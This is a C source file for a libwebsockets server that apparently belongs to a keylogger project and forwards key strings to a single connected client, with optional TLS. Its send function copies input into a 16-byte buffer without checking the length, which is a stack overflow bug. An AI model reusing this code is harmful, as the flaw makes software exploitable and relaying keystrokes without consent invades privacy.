#include "websocket.h"

#include <libwebsockets.h>
#include <stdbool.h>

struct lws_context *context;
struct lws *client_wsi = NULL;

int callback_websocket(struct lws *wsi, enum lws_callback_reasons reason, void *user, void *in, size_t len) {
    struct per_session_data *psd = (struct per_session_data *)user;
    (void)in;
    (void)len;
    switch (reason) {
        case LWS_CALLBACK_ESTABLISHED:
            printf("Client connected\n");
            psd->wsi = wsi;
            client_wsi = wsi;
            lws_callback_on_writable(wsi);
            break;
        case LWS_CALLBACK_SERVER_WRITEABLE:
            lws_callback_on_writable(wsi);
            break;
        case LWS_CALLBACK_CLOSED:
            printf("Client disconnected\n");
            psd->wsi = NULL;
            if (client_wsi == wsi) {
                client_wsi = NULL;
            }
            break;
        default:
            break;
    }
    return 0;
}

void send_message_to_client(const char *key) {
    if (client_wsi == NULL) {
        return;
    }

    unsigned char buf[LWS_PRE + 16];
    unsigned char *p = &buf[LWS_PRE];
    size_t n = strlen(key);
    memcpy(p, key, n);

    lws_write(client_wsi, p, n, LWS_WRITE_TEXT);
}

struct lws_protocols protocols[] = {{
                                        "websocket-server",
                                        callback_websocket,
                                        sizeof(struct per_session_data),
                                        0,
                                        .id = 0,
                                    },
                                    {NULL, NULL, 0, 0, .id = 0}};

int init_websocket_server(uint16_t port) {
    if (port == 0) {
        perror("Invalid port number\n");
        return -1;
    }

    struct lws_context_creation_info info;
    memset(&info, 0, sizeof(info));
    info.port = port;
    info.protocols = protocols;
    info.gid = -1;
    info.uid = -1;
    info.options |= LWS_SERVER_OPTION_HTTP_HEADERS_SECURITY_BEST_PRACTICES_ENFORCE;
    info.options |= LWS_SERVER_OPTION_VALIDATE_UTF8;
    info.options |= LWS_SERVER_OPTION_DISABLE_IPV6;

    const char *env_ssl_cert = getenv("KEYLOGGER_SSL_CERT_PATH");
    const char *env_ssl_key = getenv("KEYLOGGER_SSL_KEY_PATH");
    const bool ssl_cert_path = env_ssl_cert != NULL && env_ssl_cert[0] != '\0';
    const bool ssl_key_path = env_ssl_key != NULL && env_ssl_key[0] != '\0';

    if (ssl_cert_path && ssl_key_path) {
        printf("Use secure websocket\n");
        info.options |= LWS_SERVER_OPTION_DO_SSL_GLOBAL_INIT;
        info.ssl_cert_filepath = env_ssl_cert;
        info.ssl_private_key_filepath = env_ssl_key;
        // Optional CA
        const char *env_ssl_ca = getenv("KEYLOGGER_SSL_CA_PATH");
        const bool ssl_ca_path = env_ssl_ca != NULL && env_ssl_ca[0] != '\0';
        if (ssl_ca_path) {
            info.ssl_ca_filepath = env_ssl_ca;
        }
    }

    static const struct lws_protocol_vhost_options headers[] = {{NULL, NULL, "Cache-Control", "no-cache, no-store"},
                                                                {NULL, NULL, NULL, NULL}};
    static const struct lws_protocol_vhost_options vhost_options[] = {{NULL, headers, "websocket-server", ""},
                                                                      {NULL, NULL, NULL, NULL}};
    info.pvo = vhost_options;

    context = lws_create_context(&info);
    if (!context) {
        fprintf(stderr, "Failed to create context for port %d\n", port);
        return -1;
    }
    return 0;
}

void destroy_websocket_server() {
    if (context) {
        lws_context_destroy(context);
    }
}
